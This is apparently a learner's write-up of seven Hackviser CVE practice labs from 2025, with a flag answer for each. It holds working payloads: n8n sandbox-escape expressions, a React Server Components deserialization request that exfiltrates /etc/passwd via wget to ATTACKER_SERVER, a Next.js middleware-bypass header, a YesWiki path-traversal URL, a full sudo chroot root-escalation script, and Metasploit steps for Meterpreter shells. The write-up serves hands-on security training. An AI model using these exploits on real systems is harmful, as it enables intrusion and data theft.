---
title: 'CVE 2025'
date: '2026-05-04'
excerpt: 'CVE-2025-68613, CVE-2025-55182, CVE-2025-24813, CVE-2025-29927, CVE-2025-31131, CVE-2025-32463, CVE-2025-49113'
prog: 'Hackviser CVE Labs  -  June 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_hackviser_logo.webp" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">CVE 2025</h1>
<div class="writeup-date">June 2026 · CVE Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Common Vulnerabilities and Exposures Labs</p>

<h4 class="mb-2"><strong>1. n8n Remote Code Execution (CVE-2025-68613)</strong></h4>
<p class="mb-3">n8n is a source-available, open-source workflow automation tool that enables users to connect applications, APIs, and data sources through a visual, node-based interface to automate tasks without deep coding knowledge. It is widely used for integrating disparate services and creating complex logic flows. This laboratory contains the CVE-2025-68613 vulnerability identified in n8n versions starting from 0.211.0 and prior to 1.120.4, 1.121.1, and 1.122.0. This critical vulnerability allows an authenticated attacker to escape the sandbox environment used for expression evaluation. Under certain conditions, malicious JavaScript expressions injected by users with workflow editing permissions are evaluated in a context that allows access to global Node.js objects. This flaw leads to Remote Code Execution (RCE) on the server with the privileges of the n8n process. 
<br />
Exploitation Steps: To exploit this vulnerability, you must first log in using the provided credentials and create a workflow. Add an "Edit Fields" (or Set) node, switch a parameter to Expression mode, and use the following payloads:
<br />
<strong>1. Reconnaissance: Dump Environment Variables</strong><br />
Check if you can access the process environment to see sensitive keys.</p>

```javascript
{{ (function(){ return this.process.env; })() }}
```
<p class="mb-3"><strong>
2. Verification: Remote Code Execution (RCE)</strong><br />
Verify remote code execution by running the id command.</p>

```javascript
{{ (function() {
 var require = this.process.mainModule.require;
 var execSync = require('child_process').execSync;
 return execSync('id').toString();
})() }}
```

<p class="mb-3">Credentials: HTTP Port: <code>5678</code>, Username: <code>admin@local.hv</code>, Password: <code>Password1337!</code> <br />Exploit the vulnerability to read the <code>/secret.txt</code> file on the server. What is the secret content?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2025-68613</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-68613/cvelabs_cve-2025-68613_image1.png" alt="CVE-2025-68613 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set PASSWORD Password 1337!</code>, <code>set RHOSTS [target_IP]</code>, <code>set USERNAME admin@local.hv</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to execute shell commands for reading secret.txt.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-68613/cvelabs_cve-2025-68613_image2.png" alt="CVE-2025-68613 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Phobos</p>
<br />

<h4 class="mb-2">2. React Server Components Remote Code Execution (CVE-2025-55182)</h4>
<p class="mb-3">This laboratory demonstrates a critical vulnerability identified as CVE-2025-55182 (tracked as CVE-2025-66478 for Next.js). The flaw exists in the "Flight" protocol implementation used by RSC. Due to unsafe deserialization of payloads sent to Server Function endpoints, an unauthenticated attacker can execute arbitrary code on the server (RCE). This vulnerability has a critical severity score of CVSS 10.0. The vulnerability affects the following specific versions: React: Versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 and Next.js: Versions 15.x, 16.x, and Canary releases starting from v14.3.0-canary.77. The following Proof of Concept (PoC) payload exploits prototype pollution to trigger Remote Code Execution (RCE) and exfiltrates target data via an Out-of-Band (OOB) channel. The wget command within the payload reads the /secret.txt file and sends its content to the attacker's listener.</p>

```http
POST / HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 503

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require('child_process').exec('wget --post-file=/etc/passwd http://ATTACKER_SERVER');","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
<p class="mb-3">Note: The target machine has no internet access (air-gapped). You must set up a local listener (HTTP/POST) and direct the OOB request to your local IP address. Exploit the vulnerability to read the <code>/secret.txt</code> file on the server. What is the secret content?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2025-55182</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-55182/cvelabs_cve-2025-55182_image1.png" alt="CVE-2025-55182 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A command shell session will open to execute commands for reading secret.txt.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-55182/cvelabs_cve-2025-55182_image2.png" alt="CVE-2025-55182 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Obsidian</p>
<br />

<h4 class="mb-2">3. Apache Tomcat 9.0.0-9.0.98/10.1.0-10.1.34/11.0.0-11.0.2 Remote Code Execution (CVE-2025-24813)</h4>
<p class="mb-3">Apache Tomcat is an open-source web server and servlet container used to run Java-based web applications. This laboratory contains the CVE-2025-24813 vulnerability identified in Apache Tomcat versions 9.0.0-9.0.98, 10.1.0-10.1.34, and 11.0.0-11.0.2. This critical vulnerability arises from improper handling of partial PUT requests and flaws in the path equivalence mechanism. When write permissions are enabled on the default servlet and file-based session persistence is configured, the vulnerability allows attackers to perform remote code execution on the server. Attackers can upload JSP web shell files in chunks using the Content-Range header and execute arbitrary Java code through the session deserialization mechanism. What is the secret in the <code>/secret.txt</code> file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2025-24813</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-24813/cvelabs_cve-2025-24813_image1.png" alt="CVE-2025-24813 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>, <code>set LHOST [local_IP]</code> and <code>set RPORT 80</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to execute shell commands for reading secret.txt.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-24813/cvelabs_cve-2025-24813_image2.png" alt="CVE-2025-24813 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Falstaff</p>
<br />

<h4 class="mb-2">4. Next.js Middleware Authorization Bypass (CVE-2025-29927)</h4>
<p class="mb-3">Next.js is an open-source web framework developed by Vercel that powers React-based applications with capabilities such as server-side and static rendering.

This laboratory contains a critical vulnerability in Next.js middleware functionality, identified as CVE-2025-29927. The flaw allows complete bypass of middleware-based authorization by including a specially crafted <code>x-middleware-subrequest</code> header in HTTP requests. This is especially dangerous for applications that depend on middleware for access control, path rewrites, server redirects, and security headers such as Content Security Policy (CSP).

The vulnerability affects Next.js versions 11.1.4 through 13.5.6, 14.x before 14.2.25, and 15.x before 15.2.3.

What is the secret on the <code>/dashboard</code> page accessible by bypassing access control?</p>
<p class="mb-3"><strong>Steps: </strong>Opening the web app shows us a login page located at <code>target_URL/login</code>.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-29927/cvelabs_cve-2025-29927_image1.png" alt="CVE-2025-29927 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Open the Network tab in DevTools and refresh the page. This will reload the webpage files. Right-click on the GET request sent to the <code>/login</code> page and copy as fetch. Then paste it into the console. We replace the <code>/login</code> with <code>/dashboard</code>, and add the payload <code>"X-Middleware-Subrequest": "middleware:middleware:middleware:middleware:middleware",</code> into the headers.</p>

```javascript
fetch("https://included-vogue.europe1.hackviser.space/dashboard", {
  "headers": {
    "X-Middleware-Subrequest": "middleware:middleware:middleware:middleware:middleware",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "body": null,
  "method": "GET",
  "mode": "cors",
  "credentials": "omit"
});
```
<p class="mb-3">Once we press Enter, the HTTP GET request will be sent, and we will be notified of the results. Viewing the link that appeared in the console in the Network tab leads us to the GET request.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-29927/cvelabs_cve-2025-29927_image2.png" alt="CVE-2025-29927 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">We will get the answer for this lab when we preview the GET request sent to <code>/dashboard</code>.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-29927/cvelabs_cve-2025-29927_image3.png" alt="CVE-2025-29927 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Venus</p>
<br />

<h4 class="mb-2">5. YesWiki < 4.5.2 Unauthenticated Path Traversal (CVE-2025-31131)</h4>
<p class="mb-3">YesWiki is an open-source wiki system written in PHP that allows users to create and manage collaborative content with a flexible templating system.

This laboratory contains the CVE-2025-31131 vulnerability identified in YesWiki versions prior to 4.5.2. This high-severity vulnerability with a CVSS score of 8.6 stems from improper validation of the <code>squelette</code> parameter in file operations. The flaw allows unauthenticated attackers to perform path traversal attacks by manipulating the <code>squelette</code> parameter with dot-dot-slash (<code>../</code>) sequences to break out of the intended directory and access arbitrary files on the server. Attackers can read sensitive files containing configuration data, passwords (such as <code>wakka.config.php</code> which contains database credentials), log data, source code, and other critical system files. This vulnerability leads to complete loss of confidentiality, allowing unauthorized access to files like <code>/etc/passwd</code> and application configuration files without requiring any authentication.

What is the name of the last user added to the <code>/etc/passwd</code> file?</p>
<p class="mb-3"><strong>Steps: </strong>Once we open the target IP in a web browser, we directly append the payload <code>/?UrkCEO/edit&theme=margot&squelette=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&style=margot.css</code> to the end of the IP and press enter to send a HTTP GET Request.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-31131/cvelabs_cve-2025-31131_image1.png" alt="CVE-2025-31131 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> diamond</p>
<br />

<h4 class="mb-2">6. Sudo 1.9.14 – 1.9.17 Local Privilege Escalation via chroot (CVE-2025-32463)</h4>
<p class="mb-3">Sudo is the standard Unix/Linux tool that lets ordinary users run specific commands with temporary root privileges while recording every action. In versions 1.9.14 through 1.9.17, a critical vulnerability (CVSS 9.3) in the <code>--chroot</code> (<code>-R</code>) option allows any local user to gain root access. The issue was fixed in 1.9.17p1, and the chroot option has been disabled.
Using the low-privilege credentials, you must connect to the machine over SSH and escalate to root. (Because the box has no internet access, exploit files cannot be downloaded from the web; instead, transfer them via a local HTTP server over HackerBox/VPN, or use copy-and-paste.)
<br />
SSH username: <code>guest</code><br />
SSH password: <code>guest</code><br />
SSH port: <code>22</code><br />
What is the secret inside the /secret.txt file?</p>
<p class="mb-3"><strong>Steps: </strong>We need to ssh to the target IP with the credentials given. Once we are inside, we use <code>nano exploit.sh</code> and paste the following payload (credits to <a href="https://github.com/kh4sh3i/CVE-2025-32463" target="_blank" rel="noopener noreferrer">mohsen khahsei for this GitHub repository of CVE-2025-32463</a>) and save the file.</p>

```bash
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

<p class="mb-3">Then we run <code>chmod +x exploit.sh</code> and <code>./exploit.sh</code>. We should now have our privileges escalated from <code>guest</code> to <code>root</code>. Reading secret.txt gives us the answer to this lab.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-32463/cvelabs_cve-2025-32463_image1.png" alt="CVE-2025-32463 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3"></p>
<p class="mb-5"><strong>Answer:</strong> Artemis</p>
<br />

<h4 class="mb-2">7. Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization (CVE-2025-49113)</h4>
<p class="mb-3">Roundcube Webmail is a browser-based, open-source PHP client that connects to mailboxes via IMAP and sends emails using SMTP. It comes pre-installed with hosting panels like cPanel and Plesk; runs on Apache or Nginx, and stores data in MySQL, PostgreSQL, or SQLite. It offers users an AJAX-based interface, drag-and-drop message management, rich text editor, plugin/theme support, keyboard shortcuts, and support for over 70 languages. These features make Roundcube one of the most widely used webmail front-ends in shared hosting environments.
<br />
CVE-2025-49113 is a critical vulnerability affecting all versions up to and including 1.6.10 (as well as the 1.5.x series prior to 1.5.10). Since the <code>_from</code> parameter in <code>program/actions/settings/upload.php</code> is not properly validated, an authenticated attacker can submit a malicious value to trigger unsafe PHP object deserialization and execute arbitrary commands with web server privileges—leading to full system compromise (CVSS 9.9 / Critical).
<br />
Roundcube username: <code>roundcube</code><br />
Roundcube password: <code>rcpass</code><br />
What is the secret inside the <code>/secret.txt</code> file?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2025-49113</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-49113/cvelabs_cve-2025-49113_image1.png" alt="CVE-2025-49113 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>, <code>set USERNAME roundcube</code>, <code>set PASSWORD rcpass</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Meterpreter session will open, and we enter <code>shell</code> to execute shell commands for reading secret.txt.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2025/cve-2025-49113/cvelabs_cve-2025-49113_image2.png" alt="CVE-2025-49113 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> Hephaestus</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">June 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>